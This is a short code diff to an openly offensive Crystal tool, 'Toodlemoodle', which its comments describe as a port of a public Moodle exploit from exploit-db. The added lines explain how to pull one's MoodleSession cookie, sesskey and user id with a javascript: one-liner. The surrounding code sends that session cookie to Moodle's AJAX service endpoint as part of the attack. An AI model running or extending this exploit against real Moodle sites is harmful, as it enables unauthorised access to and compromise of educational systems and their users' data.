@@ -55,6 +55,12 @@ module Toodlemoodle
     # This exploit is a Crystal implementation by Claudio Spiess of the original
     # PHP version by Marko Belzetski. Many thanks.
     # From https://www.exploit-db.com/exploits/41828
+
+    # Get your sesskey, moodle session, and user id first:
+    # Login to moodle and type this in the address bar (Chrome will not let you paste): javascript:
+    # Then paste this:
+    # alert("MoodleSession: " + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "\nSessKey: " + M.cfg.sesskey + "\nUser id: " + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid"))
+    # Or paste it into the Dev Tools console.
     def http_post(url, data, moodle_session, json : Boolean)
       headers = HTTP::Headers.new
       headers.add("Cookie", "MoodleSession=" + moodle_session)
@@ -117,8 +123,6 @@ module Toodlemoodle
           end
         end
       end
-
-      puts string
 
       #     httpPost($url..$sesskey, $data, $MoodleSession,1);
       http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", data, moodle_session, true)
